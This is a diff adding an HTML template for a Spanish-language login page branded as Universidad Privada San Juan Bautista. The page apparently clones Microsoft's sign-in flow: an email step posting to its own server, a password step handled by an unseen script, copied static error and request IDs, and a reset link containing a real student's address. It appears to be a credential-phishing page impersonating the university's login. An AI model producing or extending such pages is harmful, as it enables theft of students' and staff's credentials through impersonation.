@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar Sesión - Universidad Privada San Juan Bautista</title>
+    <link rel="stylesheet" href="/static/css/login.css" />
+  </head>
+  <body>
+    <img
+      src="/static/images/headerlogo.png"
+      alt="Logo Universidad Privada San Juan Bautista"
+      class="header-logo small-logo"
+    />
+    <div class="login-container">
+      <div>
+        <img
+          src="/static/images/logo_2.png"
+          alt="Logo de la universidad"
+          class="header-logo"
+        />
+      </div>
+      <div class="slide-container">
+        <h2>Iniciar sesión</h2>
+        <form action="{% url 'login' %}" method="POST">
+          <input
+            type="email"
+            name="email"
+            placeholder="nombre.apellido@upsjb.edu.pe"
+            required
+            id="email-input"
+          />
+          <a href="/ingreso.html" class="forgot-password"
+            >¿No puede acceder a su cuenta?</a
+          >
+          <div class="next-button-container">
+            <button type="submit" id="next-button">Siguiente</button>
+          </div>
+        </form>
+      </div>
+      <div class="password-container">
+        <button class="circular-button">
+          <img src="/static/images/volver.png" alt="Regresar" />
+        </button>
+        <p><span id="email-display" class="email-display"></span></p>
+        <h2>Escribir contraseña</h2>
+        <input type="password" placeholder="Contraseña" />
+        <a
+          href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2f13841d5f-968d-4624-a7da-d68a6006a84a%2freprocess%3fctx%3drQQIARAAjZHLaxNRFMZnkjbGgDYqiODCIEHUOpN7584rgS7SR1406StpMtmUOzN3OpNOMtOZjE3zB4jLCgrFpVQKWZWuRDeC4KIb605duZQsRFzVnQmlrv0WP76zOHC-88UiHIs4FjwMj5BJIgxkAUHApCVZZHiCBEaGImIgD1UIJVWAku5dj8VrNfQiAraK-1_Lt599WXgwoO-a3a7rZ1Ipq9P1cId02cD1WypL9IB1Scp02uQNTZ_S9A-aHoSSQlrUJKBiRuQIYniQNpi0ADVGMyCvy2lB5rHxLTS1lA26JjeG41l98jsUNTy82Sad7suwS3ZLbnOuKBZblXazqnCV_AparOdspV7rjn15DVrlfKW9WLVtpb_VU-orsNzfFCpW0S-2oa3nF6yljm_hugCajZKpoFVX5YQaaczaxZZjae31Ldwo2QpasYwGmBmEk-BciBnzHNqFu9BxOAmRzENdGGUSZZ3hRY5nsKRjRhdlLAIg4lG8k3Am8InHegTriX9Oxb6lsdi2E45LOpaecD3HsGyScAzDtjpkA2sa8f0vYfp0gh5O3IyG4olbVIK6fw-EM9FoLE6Np7MJ-tXkqKbja382xI_PC68PIwd3DobUyWRqtO7AVdlZM3fA7rRsmpqbteZK84FfmNv2NAEF09WeWlhFhjKDMnAvQu9FbpxEpto-ttmWz6qeszM69leEfnqJenv5P2rfj9GD2HR_3S2MPiyV872AzyKmWeeWy615UTKALhFFssSCQzbTjxcD_yhGv79CnV39NPzw5N3nw5-F4dSjulAVxOyay-e39XWrupxbNXfLEuBcIBjebF_MZXswJ2LT6oOZozj1PU79BQ2&mkt=es-PE&hosted=0&device_platform=Windows+10&username=angela.rojas%40upsjb.edu.pe"
+          class="forgot-password"
+          >He olvidado mi contraseña</a
+        >
+        <a href="#" class="use-app">Use una aplicación en su lugar</a>
+        <button id="login-button" onclick="redirectToIngreso()">
+          Iniciar sesión
+        </button>
+      </div>
+      <div class="help-box">
+        <div class="help-text">Visita nuestro portal de ayuda:</div>
+        <div class="help-link">
+          <a href="https://ayuda.upsjb.edu.pe" target="_blank" rel="noopener">
+            https://ayuda.upsjb.edu.pe
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="additional-container">
+      <img src="/static/images/seguro.png" alt="Llave de acceso" />
+      <h3>Opciones de inicio de sesión</h3>
+    </div>
+    <div class="troubleshoot-message" id="troubleshoot-message">
+      <h4>Detalles de la solución de problemas</h4>
+      <p>
+        Al ponerse en contacto con el administrador hay que enviarle esta
+        información.
+      </p>
+      <a href="#" class="copy-info">Copiar la información en el portapapeles</a>
+      <span id="copied-text"><span class="check-icon"></span>Copiado</span>
+      <p>
+        <span class="error-code-label">Error Code:</span>
+        <span class="error-code-value">50058</span>
+      </p>
+      <p>
+        <span class="request-id-label">Request Id:</span>
+        <span class="request-id-value"
+          >732c6025-67d8-43bf-8f16-97efbf892e00</span
+        >
+      </p>
+      <p>
+        <span class="correlation-id-label">Correlation Id:</span>
+        <span class="correlation-id-value"
+          >8c6e268d-9394-497d-9f5f-9015eb31d9c1</span
+        >
+      </p>
+      <p>
+        <span class="timestamp-label">Timestamp:</span>
+        <span class="timestamp-value" id="timestamp"></span>
+      </p>
+      <p>
+        <span class="mark-errors-label"
+          >Marcar errores de inicio de sesión para revisión:</span
+        >
+        <a href="#" class="enable-marking">Habilitar marcado</a>
+      </p>
+      <p class="additional-info">
+        <span class="additional-info-text"
+          >Si tiene pensado solicitar ayuda para este problema, habilite el
+          marcado y trate de reproducir el error en 20 minutos. Los eventos
+          marcados hacen que los diagnósticos estén disponibles y se muestren al
+          administrador.</span
+        >
+      </p>
+    </div>
+    <div class="troubleshoot-container">
+      <button
+        class="troubleshoot-button"
+        type="button"
+        onclick="showMessage()"
+        title="Mostrar mensaje de solución de problemas"
+      >
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <script src="/static/scripts/login.js"></script>
+  </body>
+</html>
